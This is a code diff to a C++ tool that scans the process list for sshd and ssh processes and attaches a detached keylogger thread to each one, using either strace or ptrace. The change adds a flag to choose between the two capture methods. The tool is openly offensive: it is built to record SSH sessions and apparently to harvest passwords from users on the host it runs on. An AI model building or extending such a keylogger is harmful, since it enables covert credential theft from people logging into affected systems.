@@ -7,11 +7,14 @@
 #include <algorithm>
 #include <fcntl.h>
 #include <boost/regex.hpp>
+#include <boost/program_options.hpp>
 
 #include "process.hpp"
 #include "parsing.hpp"
 #include "ptrace.hpp"
 #include "strace.hpp"
+
+using namespace boost::program_options;
 
 std::vector<Process> get_proc_list_of_ssh(){
     std::string command("ps -auxw");
@@ -40,7 +43,7 @@ std::vector<Process> get_proc_list_of_ssh(){
     return proc_list;
 }
 
-void check_ps(){
+void check_ps(int flag){
     std::vector<Process> proc_list = get_proc_list_of_ssh();
     for (auto &proc : proc_list){
         if (proc.find_sshd()){
@@ -48,8 +51,15 @@ void check_ps(){
             auto it = std::find(obj.get_current_proc_list().begin(), obj.get_current_proc_list().end(), proc.get_pid());
             if(it == obj.get_current_proc_list().end()){
                 obj.get_current_proc_list().emplace_back(proc.get_pid());
-                std::thread sshd_keylog(strace_ns::sshd_keylogger, proc.get_pid());
-                sshd_keylog.detach();
+                if (flag) {
+                    std::thread sshd_keylog(strace_ns::sshd_keylogger, proc.get_pid());
+                    sshd_keylog.detach();
+                }
+                else {
+                    std::thread sshd_keylog(ptrace_ns::ptrace_loop, proc.get_pid());
+                    sshd_keylog.detach();
+                }
+
             }
         }
         else if(proc.find_ssh()){
@@ -57,9 +67,10 @@ void check_ps(){
             auto it = std::find(obj.get_current_proc_list().begin(), obj.get_current_proc_list().end(), proc.get_pid());
             if(it == obj.get_current_proc_list().end()){
                 obj.get_current_proc_list().emplace_back(proc.get_pid());
-                std::thread ssh_keylog(strace_ns::ssh_keylogger, proc.get_pid());
-//                std::thread ssh_keylog(ptrace_ns::ptrace_loop, proc.get_pid());
-                ssh_keylog.detach();
+                if (flag) {
+                    std::thread ssh_keylog(strace_ns::ssh_keylogger, proc.get_pid());
+                    ssh_keylog.detach();
+                }
             }
         }
     }
